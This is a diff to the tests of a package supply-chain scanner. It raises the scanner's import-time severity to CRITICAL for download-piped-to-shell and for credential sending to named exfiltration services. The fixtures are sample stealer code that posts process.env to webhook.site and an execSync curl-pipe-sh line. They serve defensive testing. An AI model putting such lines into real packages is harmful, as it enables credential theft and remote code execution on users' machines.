@@ -4,13 +4,16 @@ install_script_risk (the environment or credentials sent over the network,
 an exfiltration service, a download piped into a shell) ran on install-time
 scripts only, so an import-time stealer — in the files an npm package's
 main, bin or exports reach, or a wheel's x/__init__.py — was judged only by
-the generic rules. Those files now get a weaker version, SC-IMPORT-RISK:
-MAJOR (WARN), never CRITICAL, and narrower, because this is where ordinary
-SDK code lives: reading one variable, listing variables with a prefix,
-contacting a cloud metadata address or naming its own service must not
-count. Only the whole environment serialized or a credential store read,
-next to a network call or a named exfiltration service in the same file,
-and a download piped into a shell by an exec call.
+the generic rules. Those files now get a weaker version, SC-IMPORT-RISK,
+narrower because this is where ordinary SDK code lives: reading one
+variable, listing variables with a prefix, contacting a cloud metadata
+address or naming its own service must not count. Only the whole
+environment serialized or a credential store read, next to a network call
+or a named exfiltration service in the same file, and a download piped into
+a shell by an exec call. MAJOR (WARN), except the shapes no library needs
+(audit P0, 0.1.7: import_time_severity): a download run through a shell,
+credentials sent to a named exfiltration service — CRITICAL
+(test_import_time_signals.py has the rest).
 
 Payloads are inert: hosts are .invalid or 192.0.2.x (TEST-NET).
 """
@@ -102,13 +105,13 @@ class NpmImportTimeTests(unittest.TestCase):
                         "index.js": ("const data = JSON.stringify(process.env);\n"
                                      "module.exports = (send) => send("
                                      "'https://webhook.site/00000000-0000-0000-0000-000000000000', data);\n")})
-        self.assertEqual(import_risk(res), [("index.js", "MAJOR")])
+        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])     # sent to a named service
 
     def test_a_download_piped_into_a_shell_by_exec(self):
         res = scan_npm({"package.json": manifest(),
                         "index.js": ("const {execSync} = require('child_process');\n"
                                      "execSync('curl -s https://files.invalid/x.sh | sh');\n")})
-        self.assertEqual(import_risk(res), [("index.js", "MAJOR")])
+        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])     # fetch-and-run
         self.assertIn("runs a downloaded script through a shell",
                       issues(res, "SC-IMPORT-RISK")[0]["msg"])
 
@@ -155,10 +158,12 @@ class WheelImportTimeTests(unittest.TestCase):
         self.assertEqual(import_risk(res), [])
         self.assertEqual([i["sev"] for i in issues(res, "SC-SITECUSTOMIZE")], ["CRITICAL"])
 
-    def test_sdists_are_judged_by_their_install_scripts(self):
+    def test_an_sdists_modules_get_the_test_too(self):
+        # an sdist's package runs when it is imported, like a wheel's (0.1.7:
+        # it used to be judged by its install scripts alone)
         res = scan_sdist({"setup.py": "from setuptools import setup\nsetup(name='x')\n",
-                          "x/__init__.py": ENV_TO_COLLECTOR_PY})
-        self.assertEqual(import_risk(res), [])
+                          "x/__init__.py": ENV_TO_COLLECTOR_PY, "tests/test_x.py": ENV_TO_COLLECTOR_PY})
+        self.assertEqual(import_risk(res), [("x/__init__.py", "MAJOR")])
 
 
 class WeakerThanTheInstallTestTests(unittest.TestCase):
